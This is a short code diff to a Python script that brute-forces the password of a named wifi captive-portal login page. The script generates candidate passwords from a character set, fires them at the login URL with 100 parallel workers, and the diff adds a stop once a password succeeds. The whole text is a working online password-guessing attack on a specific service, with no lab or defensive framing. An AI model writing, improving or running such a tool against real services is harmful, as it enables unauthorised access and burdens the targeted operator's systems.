@@ -13,7 +13,7 @@ generator = wordlist.Generator("abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKL
 check_password_url = "http://hsia.rieo.eu/process.php?trylogon=yes&language=en&javascript=enabled&ctype=conference&username=free_access&password={password}&connection=conference&terms=on&submit=Connect"
 
 WORKERS=100
-CHUNK=0
+CHUNK=300
 STARTCHUNK=0
 TIMEOUT=10.0
 
@@ -50,6 +50,7 @@ if __name__ == "__main__":
                     else:
                         if res:
                             print(f"\n\nsucceeded with {password}:\n\n{res}")
+                            executor.shutdown(wait=False)
         except KeyboardInterrupt:
             print("\nShutting down...\n")
             executor.shutdown(wait=False)
